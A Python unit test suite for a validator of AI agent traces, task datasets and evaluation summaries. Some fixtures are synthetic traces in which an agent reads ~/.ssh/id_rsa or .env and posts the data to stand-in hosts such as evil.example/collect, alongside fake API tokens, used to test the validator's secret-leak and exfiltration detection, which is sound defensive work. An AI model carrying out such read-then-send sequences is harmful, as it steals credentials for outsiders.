#!/usr/bin/env python3
"""Unit tests for validate_trace.py covering trace, dataset, eval_summary, and auto modes."""

from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest

sys.path.insert(0, str(Path(__file__).resolve().parent))
import validate_trace as vt


def _write_jsonl(path: Path, records: list[dict | str]) -> None:
    lines = [r if isinstance(r, str) else json.dumps(r, sort_keys=True) for r in records]
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


class TestValidateTrace(unittest.TestCase):
    def test_clean_trace_passes_strict_and_returns_stats(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            trace_path = Path(tmp) / "session.jsonl"
            _write_jsonl(
                trace_path,
                [
                    {
                        "trace_id": "t-1",
                        "step": 1,
                        "timestamp": "2026-01-01T00:00:01Z",
                        "event_type": "model_response",
                        "tokens_in": 1000,
                        "tokens_cached": 0,
                        "tokens_out": 200,
                        "thinking_tokens": 50,
                        "tool_calls": [{"id": "c1", "name": "edit_file", "arguments": {"path": "a.py"}}],
                    },
                    {
                        "trace_id": "t-1",
                        "step": 1,
                        "timestamp": "2026-01-01T00:00:02Z",
                        "event_type": "tool_result",
                        "tool_call_id": "c1",
                        "output": "ok",
                    },
                    {
                        "trace_id": "t-1",
                        "step": 2,
                        "timestamp": "2026-01-01T00:00:03Z",
                        "event_type": "model_response",
                        "tokens_in": 1200,
                        "tokens_cached": 900,
                        "tokens_out": 100,
                        "tool_calls": [{"id": "c2", "name": "run_tests", "arguments": {"target": "tests"}}],
                    },
                    {
                        "trace_id": "t-1",
                        "step": 2,
                        "timestamp": "2026-01-01T00:00:04Z",
                        "event_type": "tool_result",
                        "tool_call_id": "c2",
                        "output": "all passed",
                    },
                    {
                        "trace_id": "t-1",
                        "step": 3,
                        "timestamp": "2026-01-01T00:00:05Z",
                        "event_type": "final_answer",
                        "tokens_in": 1300,
                        "tokens_cached": 1100,
                        "tokens_out": 80,
                    },
                ],
            )

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = vt.main([str(trace_path), "--strict", "--json"])
            self.assertEqual(rc, 0)
            out = json.loads(buf.getvalue())
            self.assertEqual(out["counts"], {"error": 0, "warn": 0, "info": 0})
            stats = out["files"][0]["stats"]
            self.assertEqual(stats["events"], 5)
            self.assertEqual(stats["steps"], 3)
            self.assertEqual(stats["tool_calls"], 2)
            self.assertEqual(stats["total_tokens_in"], 3500)
            self.assertEqual(stats["total_tokens_cached"], 2000)
            self.assertEqual(stats["total_tokens_out"], 380)

    def test_trace_invalid_json_missing_fields_and_non_monotonic_ts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "bad.jsonl"
            _write_jsonl(
                p,
                [
                    "{not valid json",
                    {"timestamp": "2026-01-01T00:00:10Z"},
                    {"session_id": "s1", "timestamp": "2026-01-01T00:00:10Z", "event_type": "step"},
                    {"session_id": "s1", "timestamp": "2026-01-01T00:00:05Z", "event_type": "step"},
                ],
            )
            res = vt.run_validation(p, mode="trace")
            codes = [d["code"] for d in res["details"]]
            self.assertIn("TR001", codes)
            self.assertIn("TR002", codes)
            self.assertIn("TR003", codes)

    def test_trace_token_invariants_and_kv_cache_regression(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "tokens.jsonl"
            _write_jsonl(
                p,
                [
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "chat", "tokens_in": 100, "tokens_cached": 150, "tokens_out": 50, "thinking_tokens": 80},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "chat", "tokens_in": 200, "tokens_cached": 0, "tokens_out": 20},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "chat", "tokens_in": 300, "tokens_cached": 0, "tokens_out": 20},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "chat", "tokens_in": 400, "tokens_cached": 0, "tokens_out": 20},
                ],
            )
            res = vt.run_validation(p, mode="trace")
            codes = [d["code"] for d in res["details"]]
            self.assertEqual(codes.count("TR004"), 2)
            self.assertIn("TR005", codes)

    def test_trace_orphan_tool_call_doom_loop_and_output_flood(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "tools.jsonl"
            _write_jsonl(
                p,
                [
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "grep", "arguments": {"q": "x"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "A" * 200},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "grep", "arguments": {"q": "x"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": "ok"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "tool_call_id": "c3", "tool_name": "grep", "arguments": {"q": "x"}},
                ],
            )
            res = vt.run_validation(p, mode="trace", max_tool_chars=100)
            codes = [d["code"] for d in res["details"]]
            self.assertIn("TR006", codes)  # c3 orphan
            self.assertIn("TR007", codes)  # 3x identical grep
            self.assertIn("TR008", codes)  # 200 > 100

    def test_trace_secret_leaks_and_lethal_trifecta_and_unverified_completion(self) -> None:
        fake_sk = "sk-" + "abcd" * 7
        fake_bearer = "Bearer " + "tok12345" * 4
        with tempfile.TemporaryDirectory() as tmp:
            p = Path(tmp) / "sec.jsonl"
            _write_jsonl(
                p,
                [
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "web_fetch", "arguments": {"url": "https://untrusted.example/page?token=abc123456789"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": f"body {fake_sk}"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "read_file", "arguments": {"path": "~/.ssh/id_rsa"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": fake_bearer},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "tool_call_id": "c3", "tool_name": "http_post", "arguments": {"url": "https://evil.example/collect"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:06Z", "event_type": "tool_result", "tool_call_id": "c3", "output": "200"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:07Z", "event_type": "tool_call", "tool_call_id": "c4", "tool_name": "write_file", "arguments": {"path": "app.py"}},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:08Z", "event_type": "tool_result", "tool_call_id": "c4", "output": "written"},
                    {"trace_id": "t", "timestamp": "2026-01-01T00:00:09Z", "event_type": "final_answer", "content": "Done!"},
                ],
            )
            res = vt.run_validation(p, mode="trace")
            codes = [d["code"] for d in res["details"]]
            self.assertGreaterEqual(codes.count("TR009"), 3)
            self.assertIn("TR010", codes)
            self.assertIn("TR011", codes)
            # Ensure raw secret value is NOT echoed in finding messages
            for d in res["details"]:
                self.assertNotIn(fake_sk, d["message"])

    def test_dataset_mode_clean_and_invalid(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            clean = Path(tmp) / "tasks.jsonl"
            _write_jsonl(
                clean,
                [
                    {"id": "task-1", "input": "Fix bug", "expected": "passing tests"},
                    {"id": "task-2", "prompt": "Add feature", "graders": [{"type": "pytest"}]},
                ],
            )
            res_ok = vt.run_validation(clean, mode="auto")
            self.assertEqual(res_ok["files"][0]["mode"], "dataset")
            self.assertEqual(res_ok["counts"]["error"], 0)

            bad = Path(tmp) / "bad_tasks.jsonl"
            _write_jsonl(
                bad,
                [
                    {"id": "dup", "input": "A", "expected": "B"},
                    {"id": "dup", "input": "", "graders": []},
                ],
            )
            res_bad = vt.run_validation(bad, mode="dataset")
            codes = [d["code"] for d in res_bad["details"]]
            self.assertIn("DS003", codes)
            self.assertIn("DS004", codes)
            self.assertIn("DS005", codes)

    def test_eval_summary_mode_clean_and_violations(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            clean = Path(tmp) / "eval_summary.json"
            clean.write_text(
                json.dumps(
                    {
                        "trials_per_task": 3,
                        "pass_pow_k": 0.5,
                        "pass_at_1": 0.75,
                        "pass_at_k": 0.95,
                        "tasks": [
                            {"id": "t1", "pass_pow_k": 0.5, "pass_at_1": 0.8, "pass_at_k": 1.0, "passed": 2},
                            {"id": "t2", "pass_pow_k": 0.0, "pass_at_1": 0.0, "pass_at_k": 0.0, "passed": 0, "gold_verified": True},
                        ],
                    }
                ),
                encoding="utf-8",
            )
            res_ok = vt.run_validation(clean, mode="auto")
            self.assertEqual(res_ok["files"][0]["mode"], "eval_summary")
            self.assertEqual(res_ok["counts"], {"error": 0, "warn": 0, "info": 0})

            bad = Path(tmp) / "bad_eval_summary.json"
            bad.write_text(
                json.dumps(
                    {
                        "trials_per_task": 1,
                        "pass_pow_k": 0.9,
                        "pass_at_1": 0.5,
                        "pass_at_k": 0.4,
                        "tasks": [
                            {"id": "t-zero", "passed": 0, "pass_at_k": 0.0},
                        ],
                    }
                ),
                encoding="utf-8",
            )
            res_bad = vt.run_validation(bad, mode="eval_summary")
            codes = [d["code"] for d in res_bad["details"]]
            self.assertIn("ES003", codes)  # trials < 3 & pass_pow_k > pass_at_1 > pass_at_k
            self.assertIn("ES004", codes)  # 0%-pass missing gold_verified

    def test_utf8_bom_and_json_array_dataset_and_empty_files(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # UTF-8 BOM JSONL trace file
            bom_trace = root / "bom_trace.jsonl"
            bom_trace.write_text(
                json.dumps({"trace_id": "bom1", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "agent_end", "status": "ok"}) + "\n",
                encoding="utf-8-sig",
            )
            res_bt = vt.run_validation(bom_trace, mode="auto")
            self.assertEqual(res_bt["files"][0]["mode"], "trace")
            self.assertEqual(res_bt["counts"], {"error": 0, "warn": 0, "info": 0})

            # UTF-8 BOM JSON array dataset (auto-detected as dataset)
            arr_ds = root / "tasks.json"
            arr_ds.write_text(
                json.dumps(
                    [
                        {"id": "t1", "input": "Compute mean", "expected": "14.0"},
                        {"id": "t2", "prompt": "Check state", "graders": [{"type": "state"}]},
                    ],
                    indent=2,
                ),
                encoding="utf-8-sig",
            )
            res_ds = vt.run_validation(arr_ds, mode="auto")
            self.assertEqual(res_ds["files"][0]["mode"], "dataset")
            self.assertEqual(res_ds["counts"], {"error": 0, "warn": 0, "info": 0})
            self.assertEqual(res_ds["files"][0]["stats"]["tasks"], 2)

            # UTF-8 BOM eval_summary with trials_per_task == 2 -> WARN:ES003
            bom_es = root / "report.json"
            bom_es.write_text(
                json.dumps({"trials_per_task": 2, "pass_at_1": 0.5, "pass_at_k": 0.75, "pass_pow_k": 0.25}),
                encoding="utf-8-sig",
            )
            res_es = vt.run_validation(bom_es, mode="auto")
            self.assertEqual(res_es["files"][0]["mode"], "eval_summary")
            self.assertTrue(any(d["severity"] == "WARN" and d["code"] == "ES003" for d in res_es["details"]))

            # Non-finite floats (NaN, Infinity) rejected with ERROR:ES002
            nan_es = root / "nan_summary.json"
            nan_es.write_text(
                '{"trials_per_task": 3, "pass_at_1": NaN, "pass_at_k": Infinity, "pass_pow_k": 0.5}',
                encoding="utf-8",
            )
            res_nan = vt.run_validation(nan_es, mode="eval_summary")
            es002_errs = [d for d in res_nan["details"] if d["severity"] == "ERROR" and d["code"] == "ES002"]
            self.assertGreaterEqual(len(es002_errs), 2)

            # 0-event trace and 0-task datasets emit WARN (fail --strict)
            empty_trace = root / "empty.jsonl"
            empty_trace.write_text("", encoding="utf-8")
            res_et = vt.run_validation(empty_trace, mode="trace")
            self.assertTrue(any(d["severity"] == "WARN" and d["code"] == "TR001" for d in res_et["details"]))

            empty_ds = root / "empty_ds.json"
            empty_ds.write_text("[]", encoding="utf-8")
            res_eds = vt.run_validation(empty_ds, mode="dataset")
            self.assertTrue(any(d["severity"] == "WARN" and d["code"] == "DS001" for d in res_eds["details"]))

    def test_template_payload_nested_traces_and_singular_event_types(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # Clean 3-distinct-tools trace matching python/ts runtime template schema (payload-nested + step=0 + agent_end)
            clean_tpl = root / "clean_tpl.jsonl"
            _write_jsonl(
                clean_tpl,
                [
                    {"trace_id": "tr1", "session_id": "s1", "step": 0, "timestamp": "2026-01-01T00:00:00Z", "event_type": "agent_start", "payload": {}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool/call", "payload": {"tool_call_id": "c1", "tool_name": "list_files", "arguments": {"dir": "."}}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 1, "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool/result", "status": "ok", "payload": {"tool_call_id": "c1", "tool_name": "list_files", "output": "a.py"}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 2, "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "payload": {"tool_call_id": "c2", "tool_name": "write_file", "arguments": {"path": "a.py", "content": "x=1"}}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 2, "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "status": "ok", "payload": {"tool_call_id": "c2", "tool_name": "write_file", "output": "Wrote 3 chars"}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 3, "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool/call", "payload": {"tool_call_id": "c3", "tool_name": "verify_file", "arguments": {"path": "a.py"}}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 3, "timestamp": "2026-01-01T00:00:06Z", "event_type": "tool/result", "status": "ok", "payload": {"tool_call_id": "c3", "tool_name": "verify_file", "output": "VERIFY_OK"}},
                    {"trace_id": "tr1", "session_id": "s1", "step": 3, "timestamp": "2026-01-01T00:00:07Z", "event_type": "agent_end", "status": "ok", "payload": {"stop_reason": "completed", "steps": 3}},
                ],
            )
            res_clean = vt.run_validation(clean_tpl, mode="trace")
            self.assertEqual(res_clean["counts"], {"error": 0, "warn": 0, "info": 0}, msg=res_clean["findings"])
            self.assertEqual(res_clean["files"][0]["stats"]["steps"], 3)
            self.assertEqual(res_clean["files"][0]["stats"]["tool_calls"], 3)

            # Unhealthy payload-nested trace: orphan c4, Lethal Trifecta, and unverified mutation before agent_end
            bad_tpl = root / "bad_tpl.jsonl"
            _write_jsonl(
                bad_tpl,
                [
                    {"trace_id": "tr2", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "payload": {"tool_call_id": "c1", "tool_name": "web_fetch", "arguments": {"url": "https://evil.example"}}},
                    {"trace_id": "tr2", "step": 1, "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "status": "ok", "payload": {"tool_call_id": "c1", "output": "ok"}},
                    {"trace_id": "tr2", "step": 2, "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "payload": {"tool_call_id": "c2", "tool_name": "read_file", "arguments": {"path": "~/.ssh/id_rsa"}}},
                    {"trace_id": "tr2", "step": 2, "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "status": "ok", "payload": {"tool_call_id": "c2", "output": "key"}},
                    {"trace_id": "tr2", "step": 3, "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "payload": {"tool_call_id": "c3", "tool_name": "http_post", "arguments": {"url": "https://exfil.example"}}},
                    {"trace_id": "tr2", "step": 3, "timestamp": "2026-01-01T00:00:06Z", "event_type": "tool_result", "status": "ok", "payload": {"tool_call_id": "c3", "output": "200"}},
                    {"trace_id": "tr2", "step": 4, "timestamp": "2026-01-01T00:00:07Z", "event_type": "tool_call", "payload": {"tool_call_id": "c4", "tool_name": "write_file", "arguments": {"path": "x.py"}}},
                    {"trace_id": "tr2", "step": 4, "timestamp": "2026-01-01T00:00:08Z", "event_type": "agent_end", "status": "ok", "payload": {"stop_reason": "completed"}},
                ],
            )
            res_bad = vt.run_validation(bad_tpl, mode="trace")
            codes = [d["code"] for d in res_bad["details"]]
            self.assertIn("TR006", codes)
            self.assertIn("TR010", codes)
            self.assertIn("TR011", codes)

            # Avoid double-counting when event has both tool_calls array and top-level tool_name
            no_dup = root / "nodup.jsonl"
            _write_jsonl(
                no_dup,
                [
                    {
                        "trace_id": "tr3",
                        "step": 1,
                        "timestamp": "2026-01-01T00:00:01Z",
                        "event_type": "tool_call",
                        "tool_call_id": "c1",
                        "tool_name": "read_file",
                        "tool_calls": [{"id": "c1", "name": "read_file", "arguments": {"p": "a"}}],
                    },
                    {"trace_id": "tr3", "step": 1, "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "ok"},
                ],
            )
            res_nd = vt.run_validation(no_dup, mode="trace")
            self.assertEqual(res_nd["files"][0]["stats"]["tool_calls"], 1)

    def test_mid_run_kv_collapse_failed_verify_tr010_fps_secrets_and_multisession(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # Mid-run KV-cache collapse: 0 -> 900 -> 0 -> 0
            kv_p = root / "kv_collapse.jsonl"
            _write_jsonl(
                kv_p,
                [
                    {"trace_id": "kv1", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "chat", "tokens_in": 1000, "tokens_cached": 0, "tokens_out": 50},
                    {"trace_id": "kv1", "step": 2, "timestamp": "2026-01-01T00:00:02Z", "event_type": "chat", "tokens_in": 1100, "tokens_cached": 900, "tokens_out": 50},
                    {"trace_id": "kv1", "step": 3, "timestamp": "2026-01-01T00:00:03Z", "event_type": "chat", "tokens_in": 1200, "tokens_cached": 0, "tokens_out": 50},
                    {"trace_id": "kv1", "step": 4, "timestamp": "2026-01-01T00:00:04Z", "event_type": "chat", "tokens_in": 1300, "tokens_cached": 0, "tokens_out": 50},
                ],
            )
            res_kv = vt.run_validation(kv_p, mode="trace")
            self.assertTrue(any(d["code"] == "TR005" for d in res_kv["details"]))

            # TR011: failed run_tests or VERIFY_FAIL must NOT clear unverified mutation
            for case_name, res_ev in (
                ("error_status", {"trace_id": "v1", "step": 2, "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "status": "error", "is_error": True, "output": "1 failed"}),
                ("verify_fail_out", {"trace_id": "v1", "step": 2, "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "status": "ok", "output": "VERIFY_FAIL: missing text"}),
            ):
                vp = root / f"{case_name}.jsonl"
                _write_jsonl(
                    vp,
                    [
                        {"trace_id": "v1", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "write_file", "arguments": {"path": "a.py"}},
                        {"trace_id": "v1", "step": 1, "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "ok"},
                        {"trace_id": "v1", "step": 2, "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "verify_file", "arguments": {"path": "a.py"}},
                        res_ev,
                        {"trace_id": "v1", "step": 3, "timestamp": "2026-01-01T00:00:05Z", "event_type": "final_answer", "content": "Done"},
                    ],
                )
                res_v = vt.run_validation(vp, mode="trace")
                self.assertTrue(any(d["code"] == "TR011" for d in res_v["details"]), msg=case_name)

            # TR010 FP fix: git_fetch + .env.example + send_message is benign; also redacted URLs must NOT trip TR009
            benign_p = root / "benign.jsonl"
            _write_jsonl(
                benign_p,
                [
                    {"trace_id": "b1", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "git_fetch", "arguments": {"remote": "origin"}},
                    {"trace_id": "b1", "step": 1, "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "https://api.example.com?access_token=[REDACTED] Bearer [REDACTED]"},
                    {"trace_id": "b1", "step": 2, "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "read_file", "arguments": {"path": ".env.example"}},
                    {"trace_id": "b1", "step": 2, "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": "PORT=3000"},
                    {"trace_id": "b1", "step": 3, "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "tool_call_id": "c3", "tool_name": "send_message", "arguments": {"text": "PR ready"}},
                    {"trace_id": "b1", "step": 3, "timestamp": "2026-01-01T00:00:06Z", "event_type": "tool_result", "tool_call_id": "c3", "output": "sent"},
                ],
            )
            res_b = vt.run_validation(benign_p, mode="trace")
            self.assertEqual(res_b["counts"], {"error": 0, "warn": 0, "info": 0}, msg=res_b["findings"])

            # Unified secret regexes (synthetic tokens via concatenation): gho_, PKCS#8, ?sig=
            fake_gho = "gho_" + "A1b2C3d4E5f6G7h8I9j0K1"
            fake_pem = "-----BEGIN " + "PRIVATE KEY-----"
            fake_sig_url = "https://cdn.example.com/obj?sig=" + "deadbeef1234"
            sec_p = root / "secrets2.jsonl"
            _write_jsonl(
                sec_p,
                [
                    {"trace_id": "s9", "timestamp": "2026-01-01T00:00:01Z", "event_type": "log", "msg": fake_gho},
                    {"trace_id": "s9", "timestamp": "2026-01-01T00:00:02Z", "event_type": "log", "msg": fake_pem},
                    {"trace_id": "s9", "timestamp": "2026-01-01T00:00:03Z", "event_type": "log", "msg": fake_sig_url},
                ],
            )
            res_s = vt.run_validation(sec_p, mode="trace")
            self.assertEqual(sum(1 for d in res_s["details"] if d["code"] == "TR009"), 3)

            # Multi-session isolation: session A fetches + reads .env, session B sends message -> NO cross-session TR010
            multi_p = root / "multi.jsonl"
            _write_jsonl(
                multi_p,
                [
                    {"trace_id": "sess-a", "step": 1, "timestamp": "2026-01-01T00:00:01Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "web_fetch", "arguments": {"url": "https://a.example"}},
                    {"trace_id": "sess-a", "step": 1, "timestamp": "2026-01-01T00:00:02Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "ok"},
                    {"trace_id": "sess-a", "step": 2, "timestamp": "2026-01-01T00:00:03Z", "event_type": "tool_call", "tool_call_id": "c2", "tool_name": "read_file", "arguments": {"path": ".env"}},
                    {"trace_id": "sess-a", "step": 2, "timestamp": "2026-01-01T00:00:04Z", "event_type": "tool_result", "tool_call_id": "c2", "output": "ok"},
                    {"trace_id": "sess-b", "step": 1, "timestamp": "2026-01-01T00:00:05Z", "event_type": "tool_call", "tool_call_id": "c1", "tool_name": "http_post", "arguments": {"url": "https://b.example"}},
                    {"trace_id": "sess-b", "step": 1, "timestamp": "2026-01-01T00:00:06Z", "event_type": "tool_result", "tool_call_id": "c1", "output": "200"},
                ],
            )
            res_m = vt.run_validation(multi_p, mode="trace")
            self.assertEqual(res_m["counts"], {"error": 0, "warn": 0, "info": 0}, msg=res_m["findings"])

    def test_directory_scan_picks_up_arbitrary_eval_summary_json_and_cli_exit_codes(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            _write_jsonl(
                root / "trace.jsonl",
                [{"trace_id": "t", "timestamp": "2026-01-01T00:00:01Z", "event_type": "start"}],
            )
            (root / "eval_summary_run1.json").write_text(
                json.dumps({"trials_per_task": 1, "pass_at_1": 0.5}),
                encoding="utf-8",
            )
            # Non-eval_summary named JSON report should also be discovered
            (root / "benchmark_report.json").write_text(
                json.dumps({"trials_per_task": 3, "pass_at_1": 0.8, "pass_at_k": 1.0, "pass_pow_k": 0.6}),
                encoding="utf-8",
            )
            # Unrelated package.json must be ignored
            (root / "package.json").write_text(json.dumps({"name": "demo", "version": "1.0.0"}), encoding="utf-8")

            res_dir = vt.run_validation(root)
            checked_files = {f["file"] for f in res_dir["files"]}
            self.assertEqual(checked_files, {"trace.jsonl", "eval_summary_run1.json", "benchmark_report.json"})

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc_nonstrict = vt.main([str(root)])
            self.assertEqual(rc_nonstrict, 0)

            buf2 = io.StringIO()
            with contextlib.redirect_stdout(buf2):
                rc_strict = vt.main([str(root), "--strict"])
            self.assertEqual(rc_strict, 1)

            err_buf = io.StringIO()
            with contextlib.redirect_stderr(err_buf):
                rc_missing = vt.main([str(root / "nope.jsonl")])
            self.assertEqual(rc_missing, 2)


if __name__ == "__main__":
    unittest.main()
